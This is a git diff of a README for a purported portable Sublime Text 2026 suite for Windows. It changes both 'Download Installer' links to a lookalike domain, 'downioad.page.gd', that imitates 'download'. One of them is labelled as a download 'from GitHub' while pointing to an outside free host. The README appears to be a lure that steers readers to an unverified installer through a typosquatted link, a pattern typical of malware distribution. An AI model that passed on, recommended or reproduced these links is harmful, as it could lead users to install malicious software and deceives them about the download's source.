@@ -2,7 +2,7 @@
 
 This repository provides a comprehensive portable suite for Sublime Text 2026, tailored for Windows users who seek an enhanced and flexible text editing environment. The suite includes optimized configurations, custom plugins, and themes to boost productivity without the need for traditional installation methods.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -72,4 +72,4 @@ For any issues, suggestions, or feedback, please open an issue on this GitHub re
 
 ## Download
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
